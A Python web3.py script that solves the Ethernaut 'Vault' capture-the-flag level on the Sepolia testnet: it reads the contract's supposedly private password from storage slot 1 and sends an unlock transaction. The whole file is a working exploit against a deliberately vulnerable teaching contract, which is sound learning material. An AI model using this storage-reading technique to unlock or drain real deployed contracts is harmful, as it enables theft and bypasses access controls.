import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))

# 1. Load & compile contract
solcx.set_solc_version(version='0.8.0')
with open('./Vault.sol', 'r') as file:
    contract_source = file.read()

compiled_sol = solcx.compile_source(contract_source)
contract_key = '<stdin>:Vault'
print(f'Compiled ./Vault.sol for contract {contract_key}')
compiled = compiled_sol[contract_key]

# 2: Load Vulnerable deployed contract
deployed_address = w3.to_checksum_address("")  # get it from ethernaut instance
vault_contract = w3.eth.contract(abi=compiled['abi'], address=deployed_address)
assert vault_contract.functions.locked().call()

# 3. get password to unlock
pwd = w3.eth.get_storage_at(vault_contract.address, 1)

# 4. Send unlock transaction to Sepolia testnet
tx = vault_contract.functions.unlock(pwd).build_transaction({
    'from': _WALLET,
    'chainId': 11155111,
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=_PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
assert tx_receipt['status'] == 1

# 4. Verify its unlocked
assert not vault_contract.functions.locked().call()
print("Verified that the Vault contract is unlocked")
